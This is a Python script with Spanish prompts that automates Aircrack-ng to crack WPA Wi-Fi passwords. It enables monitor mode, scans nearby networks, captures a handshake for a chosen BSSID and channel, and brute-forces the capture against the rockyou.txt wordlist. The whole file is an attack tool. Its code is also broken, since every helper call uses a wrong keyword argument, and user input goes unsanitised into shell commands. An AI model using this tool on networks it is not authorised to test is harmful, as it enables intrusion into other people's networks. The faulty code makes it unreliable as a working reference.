# Desarrollado Por NesAnTime, Todos los derechos Reservados
from tqdm import tqdm
import os
import subprocess
import platform
import time
import webbrowser
from colorama import init, Fore, Style
init(autoreset=True)

def clear():
    sistema = platform.system()
    if sistema == "Windows":
        os.system("cls")
    elif sistema == "Linux":
        subprocess.run(["clear"])
    else:
        print("Este Sistema No Posee Mas Soporte")
def reverse(seg):
    time.sleep(seg)
def Barra(desc):
    lista_de_elementos = range(10)
    for elemento in tqdm(lista_de_elementos, desc):
        time.sleep(0.1)

def Comand(Comando):
    try:
        subprocess.run(Comando, shell=True, check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Error Al Ejecutar Comandos :( {e}")
        input(Fore.YELLOW + "\nPresione Enter Para Finalizar... ")
def Logo():
    print(f"\n {Fore.CYAN}[+] Creado Por NesAnTime [+] \n")
    print("  ██████▓██   ██▓  ██████       ▄▄▄█████▓ ▒█████   ▒█████   ██▓    ")
    print("▒██    ▒ ▒██  ██▒▒██    ▒       ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ")
    print("░ ▓██▄    ▒██ ██░░ ▓██▄         ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ")
    print("  ▒   ██▒ ░ ▐██▓░  ▒   ██▒      ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    ")
    print("▒██████▒▒ ░ ██▒▓░▒██████▒▒        ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒")
    print("▒ ▒▓▒ ▒ ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░        ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░")
    print("░ ░▒  ░ ░▓██ ░▒░ ░ ░▒  ░ ░          ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░")
    print("░  ░  ░  ▒ ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ")
    print("      ░  ░ ░           ░                     ░ ░      ░ ░      ░  ░")
    print("         ░ ░                                                       ")
#-----------------------------------------------------------------------------

clear()
Logo()
print(Fore.BLUE + "SYS Aircrack-ng, Se a Cargado completamente. Para Buen uso de la herramienta debe conocer los conceptos basicos de la herramienta! \n")
reverse(seg=3)

print(Fore.GREEN + f"[!] Iniciando Modo Monitor, ¡Interfaz de red Estandar es (wlan0)!")
Comand(comandCreation = f"sudo airmon-ng start wlan0")
reverse(seg=2)

print(Fore.GREEN + f"[!] Listando Redes WIFI disponibles!")
reverse(seg=2)
Comand(comandCreation = f"sudo airodump-ng wlan0mon")

bssid = input(f"{Fore.RED}[SYS-Create APK]{Fore.RESET + Fore.MAGENTA} --{Fore.RESET} Ingrese el BSSID: ")
canal = int(input(f"{Fore.RED}[SYS-Create APK] {Fore.RESET + Fore.MAGENTA}- [!] {Fore.RESET}Ingrese El Canal: "))

clear()
Logo()
print(Fore.BLUE + "A Continuacion, Ingrese un Nombre para el .Cap\n")
name = input(f"{Fore.RED}[SYS-Create APK]{Fore.RESET + Fore.MAGENTA} --{Fore.RESET} Proporcione un Nombre: ")
reverse(seg=1.5)


clear()
Logo()
print(Fore.BLUE + "*** Iniciando Scanneo De WIFI ;) *** ")
Comand(comandCreation = f"sudo airodump-ng -c {canal} --bssid {bssid} -w {name} wlan0mon")
reverse(seg=1)

wpa = input(f"{Fore.RED}[SYS-Create APK]{Fore.RESET + Fore.MAGENTA} --{Fore.RESET} Ingrese El WPA: ")
clear()
Comand(comandCreation = f"sudo aircrack-ng -b {wpa} -w Scritps/allFiles/SYS Aircrack-ng/rockyou.txt {name}.cap")

